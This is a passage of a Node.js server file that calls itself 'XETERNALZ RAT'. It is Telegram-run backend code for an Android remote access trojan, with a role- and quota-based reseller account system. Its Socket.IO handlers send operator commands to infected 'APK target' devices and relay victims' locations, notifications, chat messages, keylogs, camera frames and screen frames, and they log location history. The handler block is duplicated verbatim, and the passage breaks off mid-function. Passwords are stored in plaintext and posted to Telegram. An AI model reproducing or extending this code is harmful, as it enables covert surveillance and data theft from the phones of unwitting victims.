// Simpan ke app biar bisa diakses endpoint lain
app.set('io', io);

// ══════ XETERNALZ RAT (sync.js) di-mount di sini ══════
// 1 token bot doang di seluruh server — pakai `bot` yang sama untuk
// semua: base app, create akun, RAT chat/notif. sync.js tinggal terima.
const RAT_OWNER_ID       = 8656383648;
const RAT_NOTIF_CHAT_ID  = -100396787037;   // 👈 GROUP (buat notif umum)
const RAT_NOTIF_ADMIN_ID = 8656383648;       // 👈 PRIVATE ADMIN (buat store & upgrade)

// ══════ MANAJEMEN AKUN (database.json) — MILIK index.js ══════
// Semua create akun cuma boleh di sini. sync.js murni RAT + pakasir.
// Satu database: database.json. accounts.json sudah dipensiunkan.

const ROLE_HIERARCHY = ['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'];

const CAN_CREATE_ROLES = {
  developer:    ['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'],
  'high owner': ['owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'],
  owner:        ['moderator', 'partner', 'admin', 'vip', 'reseller', 'member'],
  moderator:    ['partner', 'admin', 'vip', 'reseller', 'member'],
  partner:      ['admin', 'vip', 'reseller', 'member'],
  admin:        ['vip', 'reseller', 'member'],
  vip:          ['reseller', 'member'],
  reseller:     ['member'],
  member:       []
};

const ROLE_QUOTA = {
  developer:    { developer: Infinity, 'high owner': Infinity, owner: Infinity, moderator: Infinity, partner: Infinity, admin: Infinity, vip: Infinity, reseller: Infinity, member: Infinity },
  'high owner': { owner: 100, moderator: 100, partner: 100, admin: 100, vip: 100, reseller: 100, member: 500 },
  owner:        { moderator: 20, partner: 20, admin: 20, vip: 10, reseller: 10, member: 300 },
  moderator:    { partner: 10, admin: 10, vip: 10, reseller: 10, member: 200 },
  partner:      { admin: 10, vip: 10, reseller: 10, member: 150 },
  admin:        { vip: 10, reseller: 10, member: 100 },
  vip:          { reseller: 20, member: 50 },
  reseller:     { member: 110 }
};

const VISA_DEFAULT = {
  'high owner': { owner: 10, moderator: 10, partner: 10, admin: 10, vip: 10, reseller: 10, member: 100 },
  owner:        { moderator: 5, partner: 5, admin: 5, vip: 10, reseller: 10, member: 60 },
  moderator:    { partner: 5, admin: 5, vip: 5, reseller: 5, member: 50 },
  partner:      { admin: 5, vip: 5, reseller: 5, member: 50 },
  admin:        { vip: 5, reseller: 5, member: 50 },
  vip:          { reseller: 20, member: 30 },
  reseller:     { member: 100 }
};

function loadAccounts() {
  let arr = [];
  try { arr = JSON.parse(fs.readFileSync(DB_PATH, 'utf8')); } catch { arr = []; }
  if (!Array.isArray(arr)) arr = [];
  const map = {};
  for (const u of arr) {
    if (!u || !u.username) continue;
    const key = String(u.username).toLowerCase();
    map[key] = {
      username:      u.username,
      password:      u.password || '',
      displayName:   u.displayName || u.username,
      role:          u.role,
      uid:           u.uid,
      expiredDate:   u.expiredDate,
      lastSend:      u.lastSend,
      devices:       u.devices,
      createdBy:     u.createdBy,
      createdAt:     u.createdAt,
      trialDuration: u.trialDuration,
      trialExpiry:   u.trialExpiry,
      visa:          u.visa,
      smooth:        u.smooth
    };
  }
  return map;
}

function saveAccounts(map) {
  const arr = Object.values(map).map(a => ({
    username:      a.username || a.displayName || 'unknown',
    password:      a.password || '',
    displayName:   a.displayName || a.username,
    role:          a.role || 'member',
    uid:           a.uid,
    expiredDate:   a.expiredDate,
    lastSend:      a.lastSend,
    devices:       a.devices,
    createdBy:     a.createdBy,
    createdAt:     a.createdAt,
    trialDuration: a.trialDuration,
    trialExpiry:   a.trialExpiry,
    visa:          a.visa,
    smooth:        a.smooth
  }));
  fs.writeFileSync(DB_PATH, JSON.stringify(arr, null, 2), 'utf8');
}

function getAccountRole(username) {
  const accounts = loadAccounts();
  return (accounts[username] || {}).role || 'member';
}

function getQuotaUsed(creatorUsername, targetRole) {
  const accounts = loadAccounts();
  return Object.values(accounts).filter(
    a => a.createdBy === creatorUsername && a.role === targetRole
  ).length;
}

function getQuotaLimit(creatorUsername, targetRole) {
  const accounts = loadAccounts();
  const acc = accounts[creatorUsername];
  if (!acc) return 0;
  const myRole = acc.role || 'member';
  if (myRole === 'developer' || myRole === 'high owner') return Infinity;
  const base = (ROLE_QUOTA[myRole] || {})[targetRole];
  if (base === undefined) return 0;
  const visa = (acc.visa || {})[targetRole] || 0;
  return base + visa;
}

function getTrialExpiry(duration) {
  if (!duration || duration === 'permanent') return null;
  const now = new Date();
  if (duration === '3m')  { now.setMinutes(now.getMinutes() + 3);  return now.toISOString(); }
  if (duration === '5m')  { now.setMinutes(now.getMinutes() + 5);  return now.toISOString(); }
  if (duration === '10m') { now.setMinutes(now.getMinutes() + 10); return now.toISOString(); }
  if (duration === '3d')  { now.setDate(now.getDate() + 3);  return now.toISOString(); }
  if (duration === '7d')  { now.setDate(now.getDate() + 7);  return now.toISOString(); }
  if (duration === '30d') { now.setDate(now.getDate() + 30); return now.toISOString(); }
  return null;
}

function parseCakun(text) {
  const raw = text.replace(/^\/cakun\s*/i, '').trim();
  const lastComma = raw.lastIndexOf(',');
  if (lastComma === -1) return null;
  const displayName = raw.slice(0, lastComma).trim();
  const password = raw.slice(lastComma + 1).trim();
  if (!displayName || !password) return null;
  return { username: displayName.toLowerCase(), displayName, password };
}

function isRATOwner(userId) {
  return userId === RAT_OWNER_ID;
}

async function sendNotifAkunBaru(username, uid, createdBy, trialExpiry) {
  try {
    const expired = trialExpiry ? new Date(trialExpiry).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) : 'Permanent';
    const msg = `✅ *AKUN BARU DIBUAT*\n\nUsername: \`${username}\`\nUID: \`${uid}\`\nExpired: ${expired}\nDibuat oleh: ${createdBy}`;
    await bot.sendMessage(RAT_NOTIF_CHAT_ID, msg, { parse_mode: 'Markdown' });
  } catch (e) {
    console.error('[NOTIF] Error:', e.message);
  }
}

// Auth endpoint admin akun — validasi via sessionKey index.js (activeKeys)
function requireMainAuth(req, res, next) {
  const token = req.headers['x-auth-token'] || req.query.token;
  const info = token ? activeKeys[token] : null;
  if (!info || !info.username) return res.status(401).json({ error: 'Unauthorized' });
  req.username = info.username;
  next();
}

// ── POST /api/admin/create-account — create akun cuma di sini ──
app.post('/api/admin/create-account', requireMainAuth, async (req, res) => {
  const myRole = getAccountRole(req.username);
  const { username, password, role, trialDuration } = req.body;

  if (!username || !password || !role)
    return res.status(400).json({ error: 'Username, password, dan role wajib diisi' });

  if (!['developer', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip', 'reseller'].includes(myRole))
  return res.status(403).json({ error: 'Hanya developer, high owner, owner, moderator, partner, admin, vip, dan reseller yang bisa membuat akun' });

  const allowed = CAN_CREATE_ROLES[myRole] || [];
  if (!allowed.includes(role))
    return res.status(403).json({ error: `Role "${myRole}" tidak diizinkan membuat akun dengan role "${role}"` });

  // ── Cek Quota ──────────────────────────────────────────────
  if (myRole !== 'developer' && myRole !== 'high owner') {
  const limit = getQuotaLimit(req.username, role);
  const used  = getQuotaUsed(req.username, role);
  if (used >= limit)
    return res.status(403).json({ error: `Quota habis! Kamu sudah membuat ${used}/${limit} akun role "${role}"` });
}

  // ── ATURAN DURASI ──────────────────────────────────────────────
  // Akun selain member (reseller, owner, developer) → WAJIB permanent
  if (role !== 'member') {
    if (trialDuration && trialDuration !== 'permanent')
      return res.status(400).json({ error: `Akun role "${role}" hanya bisa permanent, tidak bisa trial` });
  }

  // Akun member → validasi durasi sesuai role pembuat
  let validDurations;
  if (role === 'member') {
    if (myRole === 'developer' || myRole === 'high owner') {
  validDurations = ['3m', '5m', '10m', '3d', '7d', '30d', 'permanent'];
} else if (myRole === 'reseller') {
  validDurations = ['permanent'];
} else {
  validDurations = ['3d', '7d', '30d', 'permanent'];
}
  } else {
    validDurations = ['permanent'];
  }

  const finalDuration = trialDuration || (role !== 'member' ? 'permanent' : null);
  if (!finalDuration || !validDurations.includes(finalDuration))
    return res.status(400).json({ error: `trialDuration tidak valid. Opsi: ${validDurations.join(', ')}` });

  const accounts = loadAccounts();
  const key = username.trim();

  if (!key || key.length < 3)
    return res.status(400).json({ error: 'Username minimal 3 karakter' });

  if (key.toLowerCase() === 'smooth' && key !== 'Smooth')
    return res.status(403).json({ error: 'Username tersebut tidak diizinkan' });

  if (accounts[key])
    return res.status(409).json({ error: `Akun "${username}" sudah ada` });

  const newUid      = crypto.randomBytes(16).toString('hex');
  const trialExpiry = getTrialExpiry(finalDuration);

  accounts[key] = {
    password:      password,
    displayName:   username.trim(),
    role:          role,
    uid:           newUid,
    createdBy:     req.username,
    createdAt:     new Date().toISOString(),
    trialDuration: finalDuration,
    trialExpiry:   trialExpiry
  };
  saveAccounts(accounts);

  const durasiLabel = finalDuration === 'permanent' ? 'Permanent' : `Trial ${finalDuration}`;
  console.log(`\x1b[36m[ADMIN]\x1b[0m Akun baru: ${key} (${role}) [${durasiLabel}] oleh ${req.username}`);

  // 👇 TAMBAHIN KODE INI DI SINI 👇
  sendTelegramNotif(
    `👤 *AKUN BARU DIBUAT (APP)*\n\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    `🆔 User Baru: \`${key}\`\n` +
    `🔑 Pass: \`${password}\`\n` +
    `🎖️ Role: ${role}\n` +
    `⏳ Durasi: ${finalDuration}\n` +
    `👑 Dibuat Oleh: ${req.username} (${myRole})\n` +
    `━━━━━━━━━━━━━━━━━━━━\n` +
    `🕒 Waktu: ${new Date().toLocaleString('id-ID')}`
  );

  await sendNotifAkunBaru(key, newUid, req.username, trialExpiry);

  res.json({ ok: true, uid: newUid, username: key, displayName: username.trim(), role, trialDuration: finalDuration, trialExpiry });
});

// ── Bot commands (1 bot: `bot`) — manajemen akun ──
bot.onText(/^\/akun$/i, (msg) => {
  const chat = msg.chat.id;
  if (!isRATOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses.');

  bot.sendMessage(chat, `*CRYLIX INFINITY— Bot Manajemen Akun*

Perintah Yang Tersedia:

• \`/cakun NamaUser, password\`
  → Buat Akun Baru

• \`/listakun\`
  → Lihat Semua Akun

• \`/delakun username\`
  → Hapus Akun

• \`/addvisa <username> <jumlah>\`
  → Tambah Quota Akun

• \`/delvisa <username> <jumlah>\`
  → Kurangi Quota Akun

• \`/cekvisa <username>\`
  → Cek Quota Akun

_Contoh:_
\`/addvisa smoothreseller 100\`
\`/delvisa smoothreseller 50\`
\`/cekvisa smoothreseller\``, { parse_mode: 'Markdown' });
});

bot.onText(/^\/addvisa (.+)/i, (msg, match) => {
  const chat = msg.chat.id;
  if (!isRATOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses.');

  const parts    = match[1].trim().split(/\s+/);
  const rawUser  = parts[0];
  const jumlahRaw = parts[1] ? parseInt(parts[1]) : null;

  if (jumlahRaw !== null && (isNaN(jumlahRaw) || jumlahRaw <= 0))
    return bot.sendMessage(chat, '⚠️ Jumlah harus lebih dari 0.');

  const accounts = loadAccounts();

  const key = accounts[rawUser]
    ? rawUser
    : Object.keys(accounts).find(k => k.toLowerCase() === rawUser.toLowerCase());

  if (!key || !accounts[key])
    return bot.sendMessage(chat, `❌ Akun "${rawUser}" tidak ditemukan.`);

  const acc     = accounts[key];
  const myRole  = acc.role || 'member';
  const allowed = CAN_CREATE_ROLES[myRole] || [];

  if (!allowed.length)
    return bot.sendMessage(chat, `❌ Role "${myRole}" tidak bisa membuat akun, VISA tidak berlaku.`);

  if (!acc.visa) acc.visa = {};

  const lines = allowed.map(targetRole => {
    const defaultAdd = (VISA_DEFAULT[myRole] || {})[targetRole] || 0;
    const tambah     = jumlahRaw !== null ? jumlahRaw : defaultAdd;
    const before     = acc.visa[targetRole] || 0;
    acc.visa[targetRole] = before + tambah;
    const base  = (ROLE_QUOTA[myRole] || {})[targetRole] || 0;
    const total = base + acc.visa[targetRole];
    return `• ${targetRole}: +${tambah} → total ${total}`;
  });

  accounts[key] = acc;
  saveAccounts(accounts);

  bot.sendMessage(chat, `✅ *VISA Ditambahkan!*\n\n👤 ${acc.displayName || key}\n🎫 Quota Ditambah:\n${lines.join('\n')}`, { parse_mode: 'Markdown' });
});

bot.onText(/^\/delvisa (.+)/i, (msg, match) => {
  const chat = msg.chat.id;
  if (!isRATOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses.');

  const parts    = match[1].trim().split(/\s+/);
  const rawUser  = parts[0];
  const jumlah   = parseInt(parts[1]);

  if (!jumlah || jumlah <= 0)
    return bot.sendMessage(chat, '⚠️ Jumlah harus lebih dari 0.');

  const accounts = loadAccounts();

  const key = accounts[rawUser]
    ? rawUser
    : Object.keys(accounts).find(k => k.toLowerCase() === rawUser.toLowerCase());

  if (!key || !accounts[key])
    return bot.sendMessage(chat, `❌ Akun "${rawUser}" tidak ditemukan.`);

  const acc     = accounts[key];
  const myRole  = acc.role || 'member';
  const allowed = CAN_CREATE_ROLES[myRole] || [];

  if (!acc.visa) acc.visa = {};

  const lines = allowed.map(targetRole => {
    const before = acc.visa[targetRole] || 0;
    acc.visa[targetRole] = Math.max(0, before - jumlah);
    const base  = (ROLE_QUOTA[myRole] || {})[targetRole] || 0;
    const total = base + acc.visa[targetRole];
    return `• ${targetRole}: -${jumlah} → total ${total}`;
  });

  accounts[key] = acc;
  saveAccounts(accounts);

  bot.sendMessage(chat, `✅ *VISA Dikurangi!*\n\n👤 ${acc.displayName || key}\n🎫 Quota Sekarang:\n${lines.join('\n')}`, { parse_mode: 'Markdown' });
});

bot.onText(/^\/cekvisa (.+)/i, (msg, match) => {
  const chat = msg.chat.id;
  if (!isRATOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses.');

  const rawUser  = match[1].trim();
  const accounts = loadAccounts();

  const key = accounts[rawUser]
    ? rawUser
    : Object.keys(accounts).find(k => k.toLowerCase() === rawUser.toLowerCase());

  if (!key || !accounts[key])
    return bot.sendMessage(chat, `❌ Akun "${rawUser}" tidak ditemukan.`);

  const acc    = accounts[key];
  const myRole = acc.role || 'member';

  if (myRole === 'developer') {
    return bot.sendMessage(chat, `👤 *${acc.displayName || key}*\n🔰 Role: developer\n♾️ Quota: Unlimited`, { parse_mode: 'Markdown' });
  }

  const allowed = CAN_CREATE_ROLES[myRole] || [];
  if (!allowed.length)
    return bot.sendMessage(chat, `👤 *${acc.displayName || key}*\n🔰 Role: ${myRole}\n❌ Tidak bisa membuat akun`, { parse_mode: 'Markdown' });

  const lines = allowed.map(targetRole => {
    const base      = (ROLE_QUOTA[myRole] || {})[targetRole] || 0;
    const visa      = (acc.visa || {})[targetRole] || 0;
    const total     = base + visa;
    const used      = getQuotaUsed(key, targetRole);
    const remaining = total - used;
    return `• *${targetRole}*: ${used}/${total} (sisa ${remaining})${visa > 0 ? ` [+${visa} visa]` : ''}`;
  });

  bot.sendMessage(chat, `👤 *${acc.displayName || key}*\n🔰 Role: ${myRole}\n📊 Quota:\n${lines.join('\n')}`, { parse_mode: 'Markdown' });
});

bot.onText(/^\/cakun (.+)/i, async (msg) => {
  const chat = msg.chat.id;
  if (!isRATOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses.');

  const parsed = parseCakun(msg.text);
  if (!parsed) {
    return bot.sendMessage(chat, `⚠️ Format Salah!

Contoh:
\`/cakun Zasa, password123\`
\`/cakun Omak, omak123\``, { parse_mode: 'Markdown' });
  }

  const { username, displayName, password } = parsed;
  const accounts = loadAccounts();
  const key      = username.toLowerCase();

  if (accounts[key]) {
    return bot.sendMessage(chat, `❌ Gagal: Akun "${username}" Sudah Ada`);
  }

  // ✅ Validasi minimal
  if (password.length < 3) {
    return bot.sendMessage(chat, '⚠️ Password minimal 3 karakter!');
  }

  const newUid = crypto.randomBytes(16).toString('hex');
  
  // ✅ FIX: semua field lengkap, biar bisa login
  accounts[key] = {
    username:      username,        // ← WAJIB (biar /validate bisa nemu)
    password:      password,         // ← WAJIB
    displayName:   displayName || username,
    role:          'member',         // default member
    expiredDate:   '2029-12-31',     // default permanent
    uid:           newUid,
    createdBy:     `telegram_${msg.from.id}`,
    createdAt:     new Date().toISOString(),
    trialDuration: 'permanent',
    trialExpiry:   null,
  };
  saveAccounts(accounts);

  bot.sendMessage(chat, `✅ *Akun Berhasil Dibuat!*

👤 Username: \`${username}\`
🔐 Password: \`${password}\`
🆔 UID: \`${newUid}\`
🎯 Role: \`member\`
📅 Expired: \`2029-12-31\`

_Simpan Baik-Baik Username & Password Ini._`, { parse_mode: 'Markdown' });
});

bot.onText(/^\/listakun$/i, (msg) => {
  const chat = msg.chat.id;
  if (!isRATOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses.');

  const accounts = loadAccounts();
  const list     = Object.entries(accounts).map(([user, data]) => ({ username: user, displayName: data.displayName, uid: data.uid || '-', createdAt: data.createdAt }));

  if (list.length === 0) return bot.sendMessage(chat, '📭 Belum Ada Akun Yang Dibuat.');

  const rows = list.map((acc, i) => {
    const tgl = new Date(acc.createdAt).toLocaleString('id-ID', {
      timeZone: 'Asia/Jakarta', day: '2-digit', month: '2-digit',
      year: '2-digit', hour: '2-digit', minute: '2-digit'
    });
    return `${i + 1}. *${acc.displayName}*\n   Login: \`${acc.username}\`\n   UID: \`${acc.uid || '-'}\`\n   Dibuat: ${tgl}`;
  }).join('\n\n');

  bot.sendMessage(chat, `👥 *Daftar Akun (${list.length})*\n\n${rows}`, { parse_mode: 'Markdown' });
});

bot.onText(/^\/delakun (.+)/i, (msg, match) => {
  const chat = msg.chat.id;
  if (!isRATOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Kamu Tidak Punya Akses.');

  const username = match[1].trim().toLowerCase();
  if (!username) {
    return bot.sendMessage(chat, `⚠️ Tulis Username Yang Mau Dihapus.\n\nContoh: \`/delakun omak\``, { parse_mode: 'Markdown' });
  }

  const accounts = loadAccounts();
  if (!accounts[username]) {
    return bot.sendMessage(chat, `❌ Gagal: Akun "${username}" Tidak Ditemukan`);
  }

  delete accounts[username];
  saveAccounts(accounts);
  // Sesi RAT (sync.js) otomatis ditolak — requireAuth selalu cek database.json.

  bot.sendMessage(chat, `🗑️ Akun \`${username}\` Berhasil Dihapus.`, { parse_mode: 'Markdown' });
});

// ══════ BOT COMMAND: BROADCAST ══════
bot.onText(/^\/bc (.+)/i, async (msg, match) => {
  const chat = msg.chat.id;
  if (!isRATOwner(msg.from.id)) return bot.sendMessage(chat, '⛔ Akses ditolak.');

  const parts = match[1].split('|').map(s => s.trim());
  const title = parts[0] || 'Broadcast';
  const body = parts[1] || '';
  const type = parts[2] || 'info';

  if (!body) {
    return bot.sendMessage(
      chat,
      '⚠️ *Format salah!*\n\n' +
      'Contoh:\n' +
      '`/bc Update Server | Server udah normal bro | success`\n\n' +
      'Type yang tersedia: `info`, `success`, `warning`, `error`',
      { parse_mode: 'Markdown' }
    );
  }

  try {
    const all = loadNotifications();
    const notif = {
      id: 'NTF-' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).slice(2, 5).toUpperCase(),
      title,
      body,
      type: type.toLowerCase(),
      from: 'OWNER',
      to: 'all',
      created_at: new Date().toISOString(),
      readBy: [],
      deletedBy: [],
    };
    all.push(notif);
    saveNotifications(all);

    bot.sendMessage(
      chat,
      `✅ *Broadcast terkirim!*\n\n` +
      `🆔 ID: \`${notif.id}\`\n` +
      `📢 Judul: ${title}\n` +
      `💬 Isi: ${body}\n` +
      `🏷️ Type: ${type}`,
      { parse_mode: 'Markdown' }
    );

    console.log(`[BC] ${notif.id} dikirim oleh owner`);
  } catch (e) {
    bot.sendMessage(chat, `❌ Gagal kirim broadcast: ${e.message}`);
  }
});


// ═══════════════════════════════════════════════════════════════
// SOCKET HANDLER: Command dari panel (CommandService.sendViaSocket)
// ═══════════════════════════════════════════════════════════════
io.on('connection', (socket) => {
  console.log(`[SOCKET] connected: ${socket.id}`);

  // APK target join room
  socket.on('device:join', (data) => {
    const deviceId = data?.deviceId || data?.id;
    if (!deviceId) return;
    socket.join(`device:${deviceId}`);
    console.log(`[SOCKET] device joined: device:${deviceId}`);
    socket.emit('device:joined', { deviceId });
  });

  // Panel Flutter emit 'command' langsung (dari CommandService.sendViaSocket)
  socket.on('command', (data) => {
    const deviceId = data?.deviceId;
    const command  = data?.command;
    if (!deviceId || !command) {
      console.log('[SOCKET-CMD] ⚠️ data kurang:', data);
      return;
    }

    console.log(`[SOCKET-CMD] ${command} → device:${deviceId}`);

    // Forward ke device
    io.to(`device:${deviceId}`).emit('command', {
      command,
      value: data.value ?? '',
      extra: data.extra ?? '',
      ts: Date.now(),
    });

    // Simpen juga ke rat_commands.json (fallback polling)
    try {
      let cmds = readRat('./rat_commands.json');
      cmds = cmds.filter(c => c.id !== deviceId);
      cmds.push({
        id: deviceId, command,
        value: data.value ?? '',
        extra: data.extra ?? '',
        from: 'panel-socket',
        ts: Date.now(),
      });
      saveRat('./rat_commands.json', cmds);
    } catch (e) {
      console.error('[SOCKET-CMD] save error:', e.message);
    }

    socket.emit('command:ack', { deviceId, command, ts: Date.now() });
  });

  // Relay event device → panel (camera:frame, screen:frame, dll)
  const relayEvents = [
    'device:location', 'device:notif', 'device:chatMessage', 'device:keylog',
    'camera:frame', 'screen:frame',
  ];
  relayEvents.forEach(evt => {
    socket.on(evt, (data) => {
      const deviceId = data?.deviceId;
      if (!deviceId) return;
      io.to(`device:${deviceId}`).emit(evt, data);
    });
  });

  // Simpen history lokasi
  socket.on('device:location', (data) => {
    const deviceId = data?.deviceId;
    if (!deviceId) return;
    try {
      let locs = [];
      if (fs.existsSync('./rat_locations.json')) {
        locs = JSON.parse(fs.readFileSync('./rat_locations.json', 'utf8'));
        if (!Array.isArray(locs)) locs = [];
      }
      locs.push({ id: deviceId, lat: data.lat, lng: data.lng, accuracy: data.accuracy ?? null, ts: data.ts ?? Date.now() });
      if (locs.length > 5000) locs = locs.slice(-5000);
      fs.writeFileSync('./rat_locations.json', JSON.stringify(locs, null, 2));
    } catch (e) { console.error('[LOC-SAVE]', e.message); }
  });

  socket.on('disconnect', () => {
    console.log(`[SOCKET] disconnected: ${socket.id}`);
  });
});
console.log('[SOCKET] Handler command + device join terpasang');
// ═══════════════════════════════════════════════════════════════
// SOCKET HANDLER: Command dari panel (CommandService.sendViaSocket)
// ═══════════════════════════════════════════════════════════════
io.on('connection', (socket) => {
  console.log(`[SOCKET] connected: ${socket.id}`);

  // APK target join room
  socket.on('device:join', (data) => {
    const deviceId = data?.deviceId || data?.id;
    if (!deviceId) return;
    socket.join(`device:${deviceId}`);
    console.log(`[SOCKET] device joined: device:${deviceId}`);
    socket.emit('device:joined', { deviceId });
  });

  // Panel Flutter emit 'command' langsung (dari CommandService.sendViaSocket)
  socket.on('command', (data) => {
    const deviceId = data?.deviceId;
    const command  = data?.command;
    if (!deviceId || !command) {
      console.log('[SOCKET-CMD] ⚠️ data kurang:', data);
      return;
    }

    console.log(`[SOCKET-CMD] ${command} → device:${deviceId}`);

    // Forward ke device
    io.to(`device:${deviceId}`).emit('command', {
      command,
      value: data.value ?? '',
      extra: data.extra ?? '',
      ts: Date.now(),
    });

    // Simpen juga ke rat_commands.json (fallback polling)
    try {
      let cmds = readRat('./rat_commands.json');
      cmds = cmds.filter(c => c.id !== deviceId);
      cmds.push({
        id: deviceId, command,
        value: data.value ?? '',
        extra: data.extra ?? '',
        from: 'panel-socket',
        ts: Date.now(),
      });
      saveRat('./rat_commands.json', cmds);
    } catch (e) {
      console.error('[SOCKET-CMD] save error:', e.message);
    }

    socket.emit('command:ack', { deviceId, command, ts: Date.now() });
  });

  // Relay event device → panel (camera:frame, screen:frame, dll)
  const relayEvents = [
    'device:location', 'device:notif', 'device:chatMessage', 'device:keylog',
    'camera:frame', 'screen:frame',
  ];
  relayEvents.forEach(evt => {
    socket.on(evt, (data) => {
      const deviceId = data?.deviceId;
      if (!deviceId) return;
      io.to(`device:${deviceId}`).emit(evt, data);
    });
  });

  // Simpen history lokasi
  socket.on('device:location', (data) => {
    const deviceId = data?.deviceId;
    if (!deviceId) return;
    try {
      let locs = [];
      if (fs.existsSync('./rat_locations.json')) {
        locs = JSON.parse(fs.readFileSync('./rat_locations.json', 'utf8'));
        if (!Array.isArray(locs)) locs = [];
      }
      locs.push({ id: deviceId, lat: data.lat, lng: data.lng, accuracy: data.accuracy ?? null, ts: data.ts ?? Date.now() });
      if (locs.length > 5000) locs = locs.slice(-5000);
      fs.writeFileSync('./rat_locations.json', JSON.stringify(locs, null, 2));
    } catch (e) { console.error('[LOC-SAVE]', e.message); }
  });

  socket.on('disconnect', () => {
    console.log(`[SOCKET] disconnected: ${socket.id}`);
  });
});
console.log('[SOCKET] Handler command + device join terpasang');

// ══════════════════════════════════════════════════════════════
// ══════ HANDLER CALLBACK — TOMBOL KONFIRMASI ══════
// ══════════════════════════════════════════════════════════════

bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data || '';
  const fromId = query.from.id;

  // 🔒 Cek admin — cuma owner yang boleh
  if (!isRATOwner(fromId)) {
    return bot.answerCallbackQuery(query.id, {
      text: '⛔ Lu bukan admin.',
      show_alert: true,
    });
  }

  // ══════ HANDLE: STORE UANG ══════
if (data.startsWith('confirm_store:')) {
  const storeId = data.split(':')[1];

  const storeUang = loadStoreUang();
  const idx = storeUang.findIndex(s => s.id === storeId);

  if (idx === -1) {
    return bot.answerCallbackQuery(query.id, {
      text: '❌ Store uang ga ketemu.',
      show_alert: true,
    });
  }

  const entry = storeUang[idx];
  if (entry.status === 'confirmed') {
    return bot.answerCallbackQuery(query.id, {
      text: '⚠️ Store uang ini udah dikonfirmasi.',
      show_alert: true,
    });
  }

  // Update: tandai confirmed
  entry.status = 'confirmed';
  entry.confirmedAt = new Date().toISOString();
  entry.confirmedBy = fromId;
  storeUang[idx] = entry;
  saveStoreUang(storeUang);

  // Edit pesan
  try {
  const storeHtml = `
<h2>💰 Store Uang — Sudah Dikonfirmasi ✅</h2>
<table bordered striped>
  <tr><th>Field</th><th>Value</th></tr>
  <tr><td>🆔 ID</td><td><code>${entry.id}</code></td></tr>
  <tr><td>👤 Nama Panggilan</td><td><code>${entry.namaPanggilan || '-'}</code></td></tr>
  <tr><td>🎮 Nama Akun</td><td><code>${entry.namaAkun || entry.username}</code></td></tr>
  <tr><td>💵 Jumlah</td><td><b>Rp ${entry.amount.toLocaleString('id-ID')}</b></td></tr>
  <tr><td>💳 Metode</td><td>${entry.paymentMethod === 'qris' ? '📱 QRIS' : '🔵 DANA'}</td></tr>
</table>
<p>✅ <i>Dikonfirmasi oleh admin pada ${new Date(entry.confirmedAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}</i></p>
`.trim();

  const edited = await editRichMessage(chatId, query.message.message_id, storeHtml);
  if (!edited) {
    // Fallback kalau rich gagal
    await bot.editMessageCaption(
      `💰 *STORE UANG - SUDAH DIKONFIRMASI* ✅\n\n` +
      `🆔 ID: \`${entry.id}\`\n` +
      `💵 Jumlah: *Rp ${entry.amount.toLocaleString('id-ID')}*\n\n` +
      `✅ Dikonfirmasi pada ${new Date(entry.confirmedAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: 'Markdown',
      }
    );
  }
} catch (e) {
  console.error('[EDIT MSG STORE]', e.message);
}

  bot.answerCallbackQuery(query.id, {
    text: '✅ Store uang berhasil dikonfirmasi!',
    show_alert: true,
  });

  console.log(`[STORE CONFIRM] ${storeId} dikonfirmasi oleh ${fromId}`);
  return;
}

  // ══════ HANDLE: UPGRADE APPROVE ══════
if (data.startsWith('upgrade_approve:')) {
  const requestId = data.split(':')[1];

  const requests = loadUpgradeRequests();
  const reqIdx = requests.findIndex(r => r.id === requestId);

  if (reqIdx === -1) {
    return bot.answerCallbackQuery(query.id, {
      text: '❌ Request ga ketemu.',
      show_alert: true,
    });
  }

  const upgradeReq = requests[reqIdx];
  if (upgradeReq.status !== 'pending') {
    return bot.answerCallbackQuery(query.id, {
      text: `⚠️ Request udah ${upgradeReq.status}.`,
      show_alert: true,
    });
  }

  // 🔥 UPDATE ROLE USER DI DATABASE
  const db = loadDatabase();
  const userIdx = db.findIndex(u => u.username === upgradeReq.username);

  if (userIdx === -1) {
    return bot.answerCallbackQuery(query.id, {
      text: '❌ User ga ketemu di database.',
      show_alert: true,
    });
  }

  const oldRole = db[userIdx].role || 'member';
  db[userIdx].role = upgradeReq.targetRole;
  saveDatabase(db);

  // Update request status
  upgradeReq.status = 'approved';
  upgradeReq.approvedAt = new Date().toISOString();
  upgradeReq.approvedBy = `telegram_${fromId}`;
  requests[reqIdx] = upgradeReq;
  saveUpgradeRequests(requests);

  // 🔥 KIRIM ROLE UPDATE KE USER VIA WEBSOCKET (biar app auto-refresh)
  const userWs = wsClients[upgradeReq.username];
  if (userWs) {
    try {
      userWs.send(JSON.stringify({
        type: 'roleUpdate',
        role: upgradeReq.targetRole,
        previousRole: oldRole,
        expiredDate: db[userIdx].expiredDate,
        timestamp: new Date().toISOString(),
      }));
      console.log(`[WS] Role update terkirim ke ${upgradeReq.username}`);
    } catch (e) {
      console.error('[WS] Gagal kirim:', e.message);
    }
  } else {
    console.log(`[WS] User ${upgradeReq.username} ga online, skip notif WS`);
  }

  // 🔥 KIRIM NOTIF KE WA USER (kalo ada sender aktif)
  try {
    const userWhatsapp = db[userIdx].whatsapp;
    if (userWhatsapp) {
      const waNumber = String(userWhatsapp).replace(/\D/g, '');
      let waTarget = waNumber;
      if (waTarget.startsWith('0')) waTarget = '62' + waTarget.slice(1);
      const waJid = waTarget + '@s.whatsapp.net';

